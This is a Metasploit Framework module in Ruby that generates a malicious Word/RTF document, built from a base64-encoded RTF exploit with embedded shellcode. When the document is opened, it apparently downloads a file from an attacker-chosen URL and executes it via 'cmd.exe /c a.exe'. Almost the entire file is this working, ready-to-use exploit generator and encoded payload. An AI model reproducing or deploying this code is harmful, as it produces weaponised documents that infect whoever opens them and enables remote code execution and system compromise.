##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'base64'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word Download Execute',
			'Description'    => %q{

			},
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'EDB', '24526' ]
				],
			'Author'         =>
				[
					'g11tch', # Original Exploit
					'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
				]
		))

		register_options(
			[
				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
				OptString.new('FILENAME', [true, 'Document output filename.', 'msf.doc']),
				OptString.new('URL', [true, 'URL to embed into the document'])
			], self.class)
		deregister_options('LHOST')
	end

	def run
		close="{}}}}}"
		word_base64 = "e1xydGYxbnNpbnNpY3BnMTI1MlxkZWZmMFxkZWZsYW5nMTAz" \
		"M3sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb250dG" \
		"Jsew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg" \
		"ICAgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC" \
		"AgICAgIHN3aXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg" \
		"ICAgICAgICAgICAgICAgICBjaGFyc2V0MCBBcmlhbDt9fXtcKlxnZW5lcmF0b3" \
		"IgTXNmdGVkaXQgNS40MS4xNS4xNTA3O30NCiAgICAgICAgICAgICAgICAgICAg" \
		"ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC" \
		"AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlld2tpbmQ0" \
		"XHVjMVxwYXJkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC" \
		"AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg" \
		"ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDANCiAgIC" \
		"AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg" \
		"ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC" \
		"AgICAgICAgICAgICAgICAgICAgICAgICAgIHMyMCBwYXJkXGYwXGZzXHBhci90" \
		"YWJccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci" \
		"5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5c" \
		"cGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccG" \
		"FyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFy" \
		"LlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLl" \
		"xwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxw" \
		"YXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYX" \
		"IuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIu" \
		"XHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXH" \
		"Bhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBh" \
		"ci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhclxwYXJ7XHNocHtcc3B9fX" \
		"tcc2hwe1xzcH19e1xzaHB7XHNwfX17XHNocHtcKlxzaHBpbnN0XHNocGZoZHIw" \
		"XHNocGJ4Y29sdW1uXHNocGJ5cGFyYVxzaCBwd3IyfXtcc3B7XHNue317fXtcc2" \
		"59e1xzbn17XCpcKn1wRnJhZ21lbnRzfXtcKlwqXCp9e1wqXCpcc3Z7XCp9OTsy" \
		"O2ZmZmZmZmZmZmYjMDUwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD" \
		"AwMDAwMDAwZTBiOTJjM2ZBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB" \
		"QUFBQUFBQUFBNWMxMTEwM2ZhNTljMzgzZmNmYWYzOTNmMTAwMTA0MDEwMTAxMD" \
		"EwMTAxMDEwMTAxZTBiOTJjM2YwMDgwMDAwMDQ2Y2IzOTNmZGVhZGJlZWZlMGI5" \
		"MmMzZmMwM2QzYjNmY2MzMzIyM2ZkZjU5MmQzZmM0M2QzYjNmY2MxODJmM2ZjND" \
		"NkM2IzZjVlNzQyYjNmNWU3OTM5M2YyNDAwMDAwMDQ0Y2IzOTNmc2x1dGZ1Y2s2" \
		"NzgyMzkzZmRlMTYzYTNmNjc4MjM5M2ZlMGI5MmMzZmMwM2QzYjNmYTU5YzM4M2" \
		"Y3YzBhMmIzZmUwYjkyYzNmNTU2Njc3ODhjMDNkM2IzZmE1OWMzODNmZmJiZTM4" \
		"M2ZlMGI5MmMzZjgwMDAwMDAwYjQ0MTM0M2Y1NTU1NTU1NTY2NjY2NjY2Y2ZhZj" \
		"M5M2Y0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0" \
		"MTQxNDE0MTQxNDE0MTQxZWI3NzMxYzk2NDhiNzEzMDhiNzYwYzhiNzYxYzhiNW" \
		"UwODhiN2UyMDhiMzY2NjM5NGYxODc1ZjJjMzYwOGI2YzI0MjQ4YjQ1M2M4YjU0" \
		"MDU3ODAxZWE4YjRhMTg4YjVhMjAwMWViZTMzNDQ5OGIzNDhiMDFlZTMxZmYzMW" \
		"MwZmNhYzg0YzA3NDA3YzFjZjBkMDFjN2ViZjQzYjdjMjQyODc1ZTE4YjVhMjQw" \
		"MWViNjY4YjBjNGI4YjVhMWMwMWViOGIwNDhiMDFlODg5NDQyNDFjNjFjM2U4OT" \
		"JmZmZmZmY1ZjgxZWY5OGZmZmZmZmViMDVlOGVkZmZmZmZmNjg4ZTRlMGVlYzUz" \
		"ZTg5NGZmZmZmZjMxYzk2NmI5NmY2ZTUxNjg3NTcyNmM2ZDU0ZmZkMDY4MzYxYT" \
		"JmNzA1MGU4N2FmZmZmZmYzMWM5NTE1MThkMzc4MWM2ZWVmZmZmZmY4ZDU2MGM1" \
		"MjU3NTFmZmQwNjg5OGZlOGEwZTUzZTg1YmZmZmZmZjQxNTE1NmZmZDA2ODdlZD" \
		"hlMjczNTNlODRiZmZmZmZmZmZkMDYzNmQ2NDJlNjU3ODY1MjAyZjYzMjAyMDYx" \
		"MmU2NTc4NjUwMA=="

		word_file = Base64.decode64(word_base64) + Rex::Text.to_hex(datastore['URL'], prefix="") + close

		file_create(word_file)
	end
end
